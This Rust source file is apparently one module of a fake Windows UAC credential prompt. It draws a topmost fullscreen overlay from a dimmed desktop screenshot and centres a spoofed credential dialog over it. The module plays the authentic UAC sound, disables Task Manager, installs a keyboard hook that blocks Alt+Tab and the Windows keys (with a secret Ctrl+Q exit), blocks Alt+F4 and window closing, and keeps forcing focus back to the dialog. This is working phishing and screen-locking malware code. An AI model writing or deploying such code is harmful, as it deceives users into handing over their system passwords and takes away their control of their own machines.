//! Fullscreen overlay window that hosts the dimmed desktop screenshot
//! and centers the UAC dialog.

use std::ptr::null_mut;
use std::sync::Mutex;
use windows::core::*;
use windows::Win32::Foundation::*;
use windows::Win32::Graphics::Gdi::*;
use windows::Win32::System::LibraryLoader::GetModuleHandleW;
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::UI::Input::KeyboardAndMouse::SetFocus;

use crate::screenshot::CapturedScreen;
use crate::dialog::register_and_create_dialog;

#[derive(Clone, Copy)]
pub struct SafeHandle<T>(pub T);
unsafe impl<T> Send for SafeHandle<T> {}
unsafe impl<T> Sync for SafeHandle<T> {}

struct OverlayState {
    bitmap: SafeHandle<HBITMAP>,
    width: i32,
    height: i32,
    dialog_hwnd: Option<SafeHandle<HWND>>,
}

static OVERLAY_STATE: Mutex<Option<OverlayState>> = Mutex::new(None);

pub unsafe fn run_uac_overlay(screen: CapturedScreen) {
    let instance = match unsafe { GetModuleHandleW(None) } {
        Ok(inst) => HINSTANCE(inst.0),
        Err(_) => return,
    };

    if let Ok(mut state) = OVERLAY_STATE.lock() {
        *state = Some(OverlayState {
            bitmap: SafeHandle(screen.hbitmap),
            width: screen.width,
            height: screen.height,
            dialog_hwnd: None,
        });
    }

    let class_name = w!("UAC_Overlay_Class");

    let wc = WNDCLASSW {
        style: CS_HREDRAW | CS_VREDRAW,
        lpfnWndProc: Some(overlay_wnd_proc),
        hInstance: instance,
        hCursor: unsafe { LoadCursorW(None, IDC_ARROW) }.unwrap_or_default(),
        hbrBackground: HBRUSH(null_mut()),
        lpszClassName: class_name,
        ..Default::default()
    };

    unsafe {
        let _ = RegisterClassW(&wc);
    }

    let hwnd = match unsafe {
        CreateWindowExW(
            WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
            class_name,
            w!("UAC_Overlay"),
            WS_POPUP | WS_VISIBLE,
            screen.x,
            screen.y,
            screen.width,
            screen.height,
            None,
            None,
            Some(instance),
            None,
        )
    } {
        Ok(h) => h,
        Err(_) => return,
    };

    // Target center point for dialog: center on the monitor where the cursor/user currently is
    let (center_x, center_y) = unsafe { get_target_monitor_center() };

    // Spawn the UAC credential dialog on top of overlay
    let dlg_hwnd = unsafe { register_and_create_dialog(hwnd, center_x, center_y) };
    if let Ok(mut state) = OVERLAY_STATE.lock() {
        if let Some(s) = state.as_mut() {
            s.dialog_hwnd = dlg_hwnd.map(SafeHandle);
        }
    }

    unsafe {
        let _ = ShowWindow(hwnd, SW_SHOW);
        let _ = SetForegroundWindow(hwnd);
        if let Some(dlg) = dlg_hwnd {
            let _ = ShowWindow(dlg, SW_SHOW);
            let _ = SetForegroundWindow(dlg);
        }

        // Play the authentic Windows UAC prompt sound
        crate::sound::play_uac_sound();

        // Disable Task Manager so Ctrl+Alt+Supr screen cannot kill this process
        crate::hooks::disable_task_manager();

        // Install low-level keyboard hook (suppresses Alt+Tab, Win keys, etc.; secret exit via Ctrl+Q)
        crate::hooks::install_keyboard_hook();

        // Standard Win32 message loop
        let mut msg = MSG::default();
        while GetMessageW(&mut msg, None, 0, 0).as_bool() {
            if let Some(dlg) = dlg_hwnd {
                if IsDialogMessageW(dlg, &msg).as_bool() {
                    continue;
                }
            }
            let _ = TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        // Uninstall hook and re-enable Task Manager on loop exit
        crate::hooks::uninstall_keyboard_hook();
        crate::hooks::enable_task_manager();
    }

    // Prevent dropping and deleting hbitmap early since OVERLAY_STATE took ownership
    std::mem::forget(screen);
}

unsafe extern "system" fn overlay_wnd_proc(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    match msg {
        WM_PAINT => {
            let mut ps = PAINTSTRUCT::default();
            let hdc = unsafe { BeginPaint(hwnd, &mut ps) };

            if let Ok(guard) = OVERLAY_STATE.lock() {
                if let Some(state) = guard.as_ref() {
                    unsafe {
                        let hdc_mem = CreateCompatibleDC(Some(hdc));
                        if !hdc_mem.is_invalid() {
                            let old_bmp = SelectObject(hdc_mem, state.bitmap.0.into());
                            let _ = BitBlt(
                                hdc,
                                0,
                                0,
                                state.width,
                                state.height,
                                Some(hdc_mem),
                                0,
                                0,
                                SRCCOPY,
                            );
                            let _ = SelectObject(hdc_mem, old_bmp);
                            let _ = DeleteDC(hdc_mem);
                        }
                    }
                }
            }

            unsafe {
                let _ = EndPaint(hwnd, &ps);
            }
            LRESULT(0)
        }

        WM_LBUTTONDOWN => {
            // Keep focus on the credential dialog if clicked outside
            if let Ok(guard) = OVERLAY_STATE.lock() {
                if let Some(state) = guard.as_ref() {
                    if let Some(dlg) = state.dialog_hwnd {
                        unsafe {
                            let _ = SetForegroundWindow(dlg.0);
                            let _ = SetFocus(Some(dlg.0));
                        }
                    }
                }
            }
            LRESULT(0)
        }

        // Block overlay window from closing
        WM_CLOSE => LRESULT(0),

        // Block Alt+F4 / system close via SC_CLOSE
        WM_SYSCOMMAND => {
            let cmd = (wparam.0 & 0xFFF0) as u32;
            if cmd == SC_CLOSE {
                return LRESULT(0);
            }
            unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) }
        }

        WM_DESTROY => {
            if let Ok(mut guard) = OVERLAY_STATE.lock() {
                if let Some(state) = guard.take() {
                    unsafe {
                        let _ = DeleteObject(state.bitmap.0.into());
                    }
                }
            }
            unsafe {
                let _ = PostQuitMessage(0);
            }
            LRESULT(0)
        }

        _ => unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) },
    }
}

/// Identifies the monitor the user is actively using (cursor position, foreground window, or primary monitor)
/// and calculates its exact center point so the dialog is always centered on that monitor.
unsafe fn get_target_monitor_center() -> (i32, i32) {
    let mut cursor_pos = POINT::default();
    let has_cursor = unsafe { GetCursorPos(&mut cursor_pos) }.is_ok();

    let hmon = if has_cursor {
        unsafe { MonitorFromPoint(cursor_pos, MONITOR_DEFAULTTOPRIMARY) }
    } else {
        let fg = unsafe { GetForegroundWindow() };
        unsafe { MonitorFromWindow(fg, MONITOR_DEFAULTTOPRIMARY) }
    };

    let mut mi = MONITORINFO {
        cbSize: std::mem::size_of::<MONITORINFO>() as u32,
        ..Default::default()
    };

    if unsafe { GetMonitorInfoW(hmon, &mut mi) }.as_bool() {
        let cx = mi.rcMonitor.left + (mi.rcMonitor.right - mi.rcMonitor.left) / 2;
        let cy = mi.rcMonitor.top + (mi.rcMonitor.bottom - mi.rcMonitor.top) / 2;
        (cx, cy)
    } else {
        let w = unsafe { GetSystemMetrics(SM_CXSCREEN) };
        let h = unsafe { GetSystemMetrics(SM_CYSCREEN) };
        (w / 2, h / 2)
    }
}

